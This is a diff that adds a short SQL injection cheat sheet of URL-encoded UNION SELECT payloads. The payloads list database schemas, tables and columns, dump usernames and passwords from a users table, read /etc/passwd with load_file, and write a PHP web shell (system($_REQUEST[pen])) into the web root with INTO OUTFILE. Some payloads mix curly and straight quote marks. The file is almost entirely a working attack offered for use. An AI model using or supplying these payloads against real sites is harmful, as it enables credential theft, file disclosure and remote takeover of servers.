@@ -1,0 +1,29 @@
+#################  Fetch all database informaiotn #####################
+
+
+
+# list database_name 
+
+'union+select+group_concat(schema_name)+from+information_schema.schemata--+       
+
+# list all table and column Name 
+
+‘union+select+group_concat(concat(’\n', table_name, ‘:’, column_name))+from+information_schema.columns+where+table_schema='users'--+ 
+
+
+# list all username and password
+
+‘union+select+group_concat(concat(’\n', username, ‘:’, password))+from+users--+
+
+
+
+# read file on server	
+	
+‘union+select+load_file(’/etc/passwd')--+
+
+
+
+# write shell on server	
+	
+'union+select+'<?php+system($_REQUEST[pen]);?>'+into+outfile+'/var/www/html/pen.php'--+
+	
